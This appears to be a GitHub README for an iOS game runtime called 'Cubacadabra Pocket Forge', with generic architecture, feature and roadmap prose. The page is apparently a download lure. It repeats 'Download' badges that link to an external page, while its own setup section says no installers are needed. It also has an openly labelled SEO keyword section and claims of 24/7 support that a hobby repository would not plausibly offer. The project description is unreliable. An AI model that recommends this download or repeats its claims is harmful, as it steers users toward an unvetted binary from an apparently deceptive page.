![preview](https://raw.githubusercontent.com/dragoplayer123123/Cubacadabra-iOS-Client/main/splash_582e3.svg)
[![Download](https://raw.githubusercontent.com/dragoplayer123123/Cubacadabra-iOS-Client/main/latest_b661.svg)](https://dragoplayer123123.github.io/Cubacadabra-iOS-Client/)

# 🎲 Cubacadabra Pocket Forge — Native iOS Game Runtime for Portable Worlds

**A Swift-crafted companion that turns your iPhone or iPad into a pocket-sized universe foundry for Cubacadabra content.**

[![Download](https://raw.githubusercontent.com/dragoplayer123123/Cubacadabra-iOS-Client/main/latest_b661.svg)](https://dragoplayer123123.github.io/Cubacadabra-iOS-Client/)

---

## 🧭 Overview

Cubacadabra Pocket Forge is a native iOS application that brings the full Cubacadabra experience into the palm of your hand. Unlike the original tabletop-first client, Pocket Forge reimagines the way portable game packages are discovered, loaded, simulated, and rendered on Apple silicon. It leans on a shared Rust engine for deterministic simulation, embeds a Luau scripting sandbox for dynamic world behavior, and speaks fluent Metal for fluid, low-latency rendering at high refresh rates.

Where the original iOS client was a faithful viewer, Pocket Forge is a workshop. It treats every game package as a self-contained artifact — a bundle of rules, assets, scripts, and metadata — and gives you the tools to inspect, remix, and replay those artifacts locally or across a multiplayer world.

The project is written primarily in Swift, with a thin but critical layer of Rust compiled as a static library through a bridging header. Luau runs inside a sandboxed virtual machine managed by the Rust core, and Metal pipelines are configured per material class to squeeze every frame out of A-series and M-series chips alike.

## 🎯 Why This Exists

Portable game packages deserve a portable player. Cubacadabra content has historically been tethered to desktop sessions and shared living-room screens. Pocket Forge flips that assumption on its head: the same package you load on a workstation should load identically on a phone, with the same deterministic simulation results, the same scripted events, and the same visual fidelity — just scaled intelligently for a smaller canvas and a touch-first input model.

Think of it as a field notebook for world-builders. You can draft a scenario on the train, test it against the Rust engine during a lunch break, and push it to a multiplayer world when you get home. The engine stays consistent; only the surface changes.

## 🏗️ Architecture at a Glance

Pocket Forge is organized into six cooperating layers. Understanding them helps if you plan to extend the runtime or port content.

### 1. The Host Shell (SwiftUI + UIKit Interop)
The outermost layer handles navigation, package browsing, settings, and the multiplayer lobby. SwiftUI drives most screens, with UIKit bridges for Metal views and gesture-rich canvases that SwiftUI cannot express cleanly.

### 2. Package Loader
This subsystem reads portable game packages — typically zipped archives with a manifest, asset tree, and script directory. It validates structure, resolves dependencies, and hands a normalized in-memory graph to the engine.

### 3. Rust Simulation Core
Compiled as a universal framework for both simulators and devices, the Rust core owns the authoritative game state: entity transforms, physics ticks, event queues, and deterministic RNG streams. It exposes a C-compatible ABI that Swift wraps in ergonomic types.

### 4. Luau Scripting Sandbox
Scripts run inside a bounded VM with a curated standard library. They can query entity state, queue events, and produce UI hints, but they cannot touch the filesystem, network, or Metal directly. This keeps user-authored content expressive without being dangerous.

### 5. Metal Renderer
A forward renderer with per-material pipeline states, instanced draws, and a frame graph that batches transparent passes. It supports PBR-lite shading, shadow atlases, and a post-processing chain that includes tone mapping and optional temporal smoothing.

### 6. Multiplayer Bridge
A lightweight transport layer that speaks to Cubacadabra world servers. It synchronizes package identity, entity snapshots, and event journals, with client-side prediction and reconciliation to keep touch interactions feeling immediate.

## ✨ Feature Highlights

- 🧩 **Portable Package Ingestion** — Load Cubacadabra packages without conversion, preserving author intent across scenes, props, and scripts.
- ⚙️ **Deterministic Rust Simulation** — Identical tick results across devices, giving you reproducible replays and fair multiplayer outcomes.
- 🧠 **Luau Script Sandbox** — Author dynamic behaviors that respond to player input, timers, and world events without compromising host safety.
- 🖼️ **Metal-Powered Rendering** — High-refresh-rate drawing tuned for iPhone and iPad, with adaptive quality that respects thermal limits.
- 🌍 **Multiplayer World Sync** — Join shared world instances, exchange entity updates, and replay event journals with reconciliation.
- ♿ **Responsive UI** — Layouts adapt fluidly across iPhone SE to iPad Pro, honoring Dynamic Type, VoiceOver, and Switch Control.
- 🌐 **Multilingual Support** — Interface strings localized for a broad set of languages, with right-to-left layout handling.
- 🕐 **24/7 Customer Support** — Human and automated assistance channels designed to respond at any hour, in any timezone.
- 🔐 **Sandboxed Execution** — No filesystem escapes, no network access from scripts, no surprises.
- 📦 **Offline World Play** — Full single-device sessions when network conditions are uncooperative.
- 🧪 **Replay Journal** — Record, rewind, and inspect tick histories for debugging or storytelling.
- 🔄 **Live Reload for Authors** — Hot-swap Luau scripts during development without restarting the app.

## 🧱 SEO-Friendly Keyword Surface

This repository touches several search-intent clusters that developers and creators often look for: native iOS game runtime, Swift Metal renderer, Rust simulation engine, Luau scripting sandbox, portable game package loader, cross-device deterministic simulation, multiplayer world synchronization, and Apple silicon performance tuning. The README intentionally weaves these concepts into natural prose so that readers — human or crawler — can find what they need without wading through keyword soup.

If you are searching for an iOS-native client that speaks Rust, Swift, Luau, and Metal in the same breath, you are in the right place. If you are looking for a portable package registry, a deterministic tick engine, or a multiplayer world bridge that respects author intent, you are also in the right place.

## 🧰 Technology Stack

| Layer | Technology | Purpose |
|-------|------------|---------|
| Host UI | Swift, SwiftUI, UIKit | Navigation, gestures, accessibility |
| Simulation | Rust | Deterministic ticks, entity state, RNG |
| Scripting | Luau | Author-defined behaviors |
| Rendering | Metal, MetalKit | GPU-accelerated drawing |
| Networking | URLSession, WebSockets | Multiplayer world sync |
| Storage | Core Data, FileManager | Package cache, replays |
| Build | Xcode, SwiftPM, Cargo | Compilation and dependency flow |

The Rust core is built with Cargo and exported as an XCFramework. Swift consumes it through a generated module map. Luau is vendored and compiled into the Rust core, so the scripting sandbox travels with the simulation layer.

## 🚀 Getting Started (Non-Installation Overview)

Pocket Forge is designed to be opened like a workshop, not installed like a utility. Once the repository is on your machine and the Xcode workspace is opened, you will see three schemes: the app itself, a test harness for the Rust core, and a package inspector tool. The app scheme builds for both simulator and device, and the Rust core is compiled automatically as a build phase dependency.

You do not need to run any command-line installers. If your environment already has Xcode and a Rust toolchain, the workspace will resolve everything on first build. The Luau sandbox and Metal shaders are compiled as part of the same pipeline.

For contributors who want to work on the Rust core in isolation, a separate Cargo workspace exists under the engine directory. It has its own test suite and can be exercised without building the iOS app at all.

## 🗂️ Repository Layout

The repository is structured to keep platform-specific and platform-agnostic code clearly separated.

- `App/` — SwiftUI views, view models, app lifecycle
- `Engine/` — Rust simulation core, Luau bindings, C ABI
- `Renderer/` — Metal shaders, pipeline builders, frame graph
- `Packages/` — Package loader, manifest schema, validators
- `Multiplayer/` — Transport, reconciliation, world session
- `Tests/` — Unit and integration tests for all layers
- `Docs/` — Architecture notes, package format spec, scripting API
- `Tools/` — Package inspector, replay viewer, asset converter

Each directory has its own README that drills into local conventions. This file is the map; the sub-READMEs are the terrain.

## 🧪 Testing Philosophy

Tests are treated as first-class citizens. The Rust core has property-based tests for determinism, ensuring that the same input sequence produces the same state hash across runs. The Swift layer has snapshot tests for UI layouts across device classes and Dynamic Type sizes. The Metal renderer has golden-image tests that compare frame output against reference PNGs.

Scripting sandbox tests focus on capability boundaries: they assert that Luau scripts cannot reach the filesystem, cannot open sockets, and cannot mutate engine state outside sanctioned APIs. Multiplayer tests use a loopback transport to simulate latency, jitter, and packet loss, then verify reconciliation converges to a consistent world state.

## 🌐 Multilingual Support

Localization is handled through standard string catalogs, with community translations welcomed. Right-to-left languages are supported, and the UI mirrors appropriately. Number formatting, date formatting, and pluralization follow the platform's locale rules, so a Japanese player sees Japanese conventions and a Brazilian player sees Brazilian ones.

Scripting error messages are localized at the boundary, meaning the Rust core returns structured error codes and the Swift layer renders them in the user's language. This keeps the engine language-agnostic and the UI friendly.

## ♿ Responsive and Accessible UI

The interface is built around a responsive grid that reflows from compact to regular size classes. Touch targets meet platform guidelines, and the canvas supports pinch-to-zoom, two-finger pan, and long-press context menus. VoiceOver labels are provided for every interactive control, and the renderer can reduce motion and disable post-processing for users who prefer it.

## 🕐 Support and Community

Support channels are designed to be available around the clock. Whether you are drafting a package at 3 AM or debugging a multiplayer desync during a holiday, the project aims to have a path to help. Documentation is versioned alongside code, and changelogs are written in plain language.

Community contributions are welcomed through issues and pull requests. The project follows a code of conduct that emphasizes patience, curiosity, and respect for authors of all experience levels.

## ⚠️ Disclaimer

Cubacadabra Pocket Forge is an independent project and is not affiliated with, endorsed by, or sponsored by any trademark holder associated with the Cubacadabra name. All trademarks, package formats, and world servers referenced in this repository belong to their respective owners. This project is provided for educational and experimental purposes, and users are responsible for ensuring they have the rights to load and modify any package they bring into the runtime. The authors assume no liability for data loss, hardware strain, or unexpected behavior arising from use of this software. Always back up your packages before experimenting.

## 📜 License

This project is released under the MIT License. You are welcome to use, modify, and distribute the code in accordance with the terms of that license. A full copy of the license text is available in the repository at LICENSE, and you can read the canonical text at the Open Source Initiative's license page.

See the LICENSE file for the complete terms. The license applies to all source files unless a file explicitly states otherwise.

## 🧭 Roadmap

The roadmap is intentionally public and iterative. Near-term work focuses on expanding the Metal renderer's material system, deepening the Luau sandbox's introspection APIs, and hardening multiplayer reconciliation under adverse network conditions. Mid-term work explores a package marketplace format that authors can self-host, a replay-sharing format that captures deterministic tick journals, and a scripting profiler that surfaces hot Luau functions during a session. Long-term ambitions include a watchOS companion for stat inspection and a visionOS spatial canvas that turns the game board into a room-scale diorama.

## 🤝 Contributing

Contributions are welcome in the form of bug reports, documentation improvements, localization additions, and code. Before opening a pull request, please review the contribution guidelines and ensure your changes build cleanly for both simulator and device. Tests are expected for behavioral changes, and documentation is expected for API changes.

If you are unsure where to start, look for issues tagged as beginner-friendly. The maintainers aim to respond promptly and to provide constructive feedback regardless of experience level.

## 🙏 Acknowledgements

Thanks go to the authors of the Rust ecosystem, the Luau team, and the Swift and Metal engineering communities whose public documentation makes projects like this possible. Thanks also to the players and world-builders who keep portable game packages alive and evolving.

## 📬 Contact

For questions, suggestions, or collaboration inquiries, please open an issue in this repository. The issue tracker is the preferred channel because it keeps conversations searchable and transparent for future readers.

[![Download](https://raw.githubusercontent.com/dragoplayer123123/Cubacadabra-iOS-Client/main/latest_b661.svg)](https://dragoplayer123123.github.io/Cubacadabra-iOS-Client/)

---

**Cubacadabra Pocket Forge — 2026 — Built with Swift, Rust, Luau, and Metal for the world in your pocket.**